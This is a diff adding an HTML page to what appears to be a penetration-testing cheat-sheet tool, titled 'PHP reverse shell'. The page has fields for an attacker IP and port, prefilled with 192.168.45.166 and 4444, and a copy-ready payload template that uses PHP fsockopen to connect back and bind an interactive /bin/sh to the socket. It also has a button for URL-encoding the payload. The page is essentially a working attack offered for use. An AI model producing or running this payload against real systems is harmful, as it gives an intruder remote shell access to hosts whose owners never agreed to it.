@@ -1,0 +1,28 @@
+<section class="page active">
+  <h1>PHP reverse shell</h1>
+  <p class="intro">
+    PHP reverse shell payloads.
+  </p>
+
+  <div class="input-row">
+    <input class="rs-input rs-ip" value="192.168.45.166" aria-label="IP address">
+    <input class="rs-input rs-port" value="4444" aria-label="Port">
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>PHP</h2>
+    <span></span>
+  </div>
+
+  <div class="payload-block">
+    <div class="payload-box">
+      <code class="copy-text rs-payload" data-template="php -r '$sock=fsockopen(&quot;{IP}&quot;,{PORT});exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'"></code>
+      <button class="copy-icon" type="button" title="Copy">Copy</button>
+    </div>
+    <div class="action-row">
+      <button class="copy-main" type="button">Copy the reverse shell</button>
+      <button class="secondary-button url-encode-button" type="button">URL encoded</button>
+    </div>
+  </div>
+</section>
